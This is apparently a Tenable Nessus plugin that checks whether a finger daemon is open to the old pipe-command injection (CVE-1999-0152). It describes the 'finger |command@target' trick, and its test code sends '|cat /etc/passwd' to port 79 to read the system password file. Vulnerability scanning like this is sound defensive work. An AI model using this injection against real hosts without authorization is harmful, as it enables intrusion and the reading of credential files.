#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10126);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-1999-0152");
 script_xref(name:"OSVDB", value:"100");

 script_name(english:"in.fingerd Pipe Input Arbitrary Command Execution");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command execution 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to force the remote finger daemon to execute arbitrary
commands by issuing requests like :

  finger  |command_to_execute@target
	
An attacker may use this bug to gain a shell on this host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1997_3/0291.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1997_3/0315.html" );
 script_set_attribute(attribute:"solution", value:
"Disable your finger daemon if you do not use it, or apply the latest
patches from your vendor." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Determines whether in.fingerd is exploitable");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Finger abuses");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/finger", 79);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/finger");
if(!port)port = 79;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = string("|cat /etc/passwd\r\n");
  send(socket:soc, data:d);
  r = recv(socket:soc, length:65535);
  if(egrep(pattern:"root:.*:0:[01]:", string:r))security_hole(port);
  close(soc);
 }
}
